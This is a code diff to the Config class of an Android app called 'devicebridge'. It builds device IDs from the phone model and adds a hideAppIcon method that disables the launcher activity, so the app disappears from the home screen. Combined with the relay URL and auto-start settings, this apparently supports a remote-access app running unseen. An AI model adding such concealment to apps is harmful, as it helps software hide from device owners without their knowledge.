@@ -1,6 +1,8 @@
 package com.devicebridge.utils;
 
 import android.content.Context;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
 import android.content.SharedPreferences;
 
 public class Config {
@@ -33,7 +35,8 @@ public class Config {
         if (existing != null && !existing.isEmpty()) {
             return existing;
         }
-        String generated = "db_" + java.util.UUID.randomUUID().toString()
+        String modelStr = android.os.Build.MODEL.replaceAll("[^a-zA-Z0-9]", "").toLowerCase();
+        String generated = modelStr + "_" + java.util.UUID.randomUUID().toString()
                 .replace("-", "").substring(0, 8);
         saveConfig(ctx, getRelayUrl(ctx), generated);
         return generated;
@@ -44,6 +47,16 @@ public class Config {
                 .edit()
                 .putBoolean(KEY_AUTO_START, enabled)
                 .apply();
+    }
+
+    public static void hideAppIcon(Context ctx) {
+        try {
+            PackageManager p = ctx.getPackageManager();
+            ComponentName componentName = new ComponentName(ctx, com.devicebridge.MainActivity.class);
+            p.setComponentEnabledSetting(componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {}
     }
 
     public static boolean isAutoStart(Context ctx) {
